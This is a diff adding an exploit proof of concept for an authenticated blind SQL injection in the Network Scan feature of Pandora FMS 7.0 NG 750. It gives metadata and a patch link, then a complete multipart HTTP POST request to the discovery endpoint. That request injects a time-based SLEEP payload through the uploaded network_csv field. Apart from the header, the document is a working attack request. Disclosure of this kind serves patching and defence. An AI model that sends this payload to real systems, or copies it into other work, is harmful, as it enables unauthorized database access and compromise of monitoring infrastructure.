@@ -1,0 +1,82 @@
+# Exploit Title: Pandora FMS 7.0 NG 750 - 'Network Scan' SQL Injection (Authenticated)
+# Date: 12-21-2020
+# Exploit Author: Matthew Aberegg, Alex Prieto
+# Vendor Homepage: https://pandorafms.com/
+# Patch Link: https://github.com/pandorafms/pandorafms/commit/d08e60f13a858fbd22ce6b83fa8ca391c608ec5c
+# Software Link: https://pandorafms.com/community/get-started/
+# Version: Pandora FMS 7.0 NG 750
+# Tested on: Ubuntu 18.04
+
+
+# Vulnerability Details
+# Description : A blind SQL injection vulnerability exists in the "Network Scan" functionality of Pandora FMS.
+# Vulnerable Parameter : network_csv
+
+
+# POC
+
+POST /pandora_console/index.php?sec=gservers&sec2=godmode/servers/discovery&wiz=hd&mode=netscan&page=1 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------308827614039434535382911921119
+Content-Length: 1597
+Origin: http://TARGET
+Connection: close
+Referer: http://TARGET/pandora_console/index.php?sec=gservers&sec2=godmode/servers/discovery&wiz=hd&mode=netscan
+Cookie: PHPSESSID=i5uv0ugb4bdu9avagk38vcdok3
+Upgrade-Insecure-Requests: 1
+
+-----------------------------308827614039434535382911921119
+Content-Disposition: form-data; name="interval_manual_defined"
+
+1
+-----------------------------308827614039434535382911921119
+Content-Disposition: form-data; name="interval_select"
+
+300
+-----------------------------308827614039434535382911921119
+Content-Disposition: form-data; name="interval_text"
+
+0
+-----------------------------308827614039434535382911921119
+Content-Disposition: form-data; name="interval"
+
+0
+-----------------------------308827614039434535382911921119
+Content-Disposition: form-data; name="interval_units"
+
+1
+-----------------------------308827614039434535382911921119
+Content-Disposition: form-data; name="taskname"
+
+test
+-----------------------------308827614039434535382911921119
+Content-Disposition: form-data; name="id_recon_server"
+
+3
+-----------------------------308827614039434535382911921119
+Content-Disposition: form-data; name="network_csv_enabled"
+
+on
+-----------------------------308827614039434535382911921119
+Content-Disposition: form-data; name="network_csv"; filename="test.txt"
+Content-Type: text/plain
+
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- a
+
+-----------------------------308827614039434535382911921119
+Content-Disposition: form-data; name="network"
+
+
+-----------------------------308827614039434535382911921119
+Content-Disposition: form-data; name="comment"
+
+test
+-----------------------------308827614039434535382911921119
+Content-Disposition: form-data; name="submit"
+
+Next
+-----------------------------308827614039434535382911921119--
